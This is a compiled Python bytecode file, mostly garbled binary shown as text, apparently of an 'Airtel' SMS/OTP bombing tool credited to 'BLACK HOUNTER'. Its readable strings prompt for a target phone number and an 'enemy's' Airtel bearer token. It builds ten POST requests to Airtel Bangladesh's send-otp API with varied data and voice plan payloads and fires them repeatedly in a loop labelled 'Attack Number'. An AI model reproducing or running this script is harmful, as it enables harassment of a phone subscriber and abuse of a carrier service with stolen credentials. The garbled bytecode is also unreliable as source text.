o
    ???b7  ?                   @   s   d dl Z e ?d? d dl Z e ?d? ed? d dlZd dl Z d dlZd dlZd dlZdZdZdZ	dZ
d	Zd
ZdZdZdd? Zeee	d e
 ??Zeee	d e
 ??Ze ?d? eed ? e?d?Zee	d ? ee	d ? eed e	 d e d ? e?d? ee	de?? d ? eed ? eed ? d dlZd dlmZ ed? dZe? Zde d ed < d!ed"< d#e d$ ZdZe? Zde d ed < d!ed"< d#e d% ZdZ e? Z!de d e!d < d!e!d"< d#e d& Z"dZ#e? Z$de d e$d < d!e$d"< d#e d' Z%dZ&e? Z'de d e'd < d!e'd"< d#e d( Z(dZ)e? Z*de d e*d < d!e*d"< d#e d) Z+dZ,e? Z-de d e-d < d!e-d"< d#e d$ Z.dZ/e? Z0de d e0d < d!e0d"< d#e d* Z1dZ2e? Z3de d e3d < d!e3d"< d#e d+ Z4dZ5e? Z6de d e6d < d!e6d"< d#e d$ Z7e8d,?D ]~Z9zrej:eeed-?Z;ej:eeed-?Z;ej:e e!e"d-?Z;ej:e#e$e%d-?Z;ej:e&e'e(d-?Z;ej:e)e'e+d-?Z;ej:e,e-e.d-?Z;ej:e/e0e1d-?Z;ej:e2e3e4d-?Z;ej:e5e6e7d-?Z;e?d.? eee9d/ g?e e;j< e d0 e	 e e
 d1 ? W ?q?   ed2? Y ?q?dS )3?    N?clearzlolcat ban.py?
z[1;90mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[1;97mc                 C   s2   | d D ]}t j?|? t j??  t?d? qd S )Nr   g{?G?z??)?sys?stdout?write?flush?time?sleep)ZJonYZword? r
   ?air.py?	logoprint   s
   
?r   z    Enter Target Number: z%
[>] ENTER YOUR ENEMYS AIRTEL TOKEN: z4
==================================================
zhttps://ipinfo.io/jsonz	 DEVELOPED BY : BLACK HOUNTERz	 VERSION 	  : 2.2u   	 ♥♥z	BLACK HOUNTER?   z	 Your IP Addreds:- Zipz3
==================================================z$  To Stop Attack press CTRL + Z....
)?CaseInsensitiveDictz%https://api.bd.airtel.com/v1/send-otpzBearer ? ZAuthorizationzapplication/jsonzContent-Typez{"phone_number":"zb","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":50,"validity":3}zb","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":60,"validity":3}zb","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":70,"validity":3}zb","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":80,"validity":3}zb","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":90,"validity":3}zc","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":0,"sms":0,"internet":100,"validity":3}zc","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":300,"sms":0,"internet":0,"validity":3}zc","lang":"bn","type":"my_plan","plan_type":"my_plan","voice":800,"sms":0,"internet":0,"validity":3}l	   ???Y*{ELu(?$(?)Zheaders?datag??&?.>?   z 
tAttack Number z Stay With Mr. FAHAD
z)Please Make Sure Your Internet Connection)=?os?system?printZasyncior   Zrequestsr   ZbiblackZbiredZbigreenZbiyellowZbiblueZbipurpleZbicyanZbiehiter   ?str?inputZnumber?token?getZresponser	   ZjsonZrequests.structuresr   Zurl1Zheaders1Zdata1Zurl2Zheaders2Zdata2Zurl3Zheaders3Zdata3Zurl4Zheaders4Zdata4Zurl5Zheaders5Zdata5Zurl6Zheaders6Zdata6Zurl7Zheaders7Zdata7Zurl8Zheaders8Zdata8Zurl9Zheaders9Zdata9Zurl10Z	headers10Zdata10?range?iZpost?x?textr
   r
   r
   r   ?<module>   s?    





:?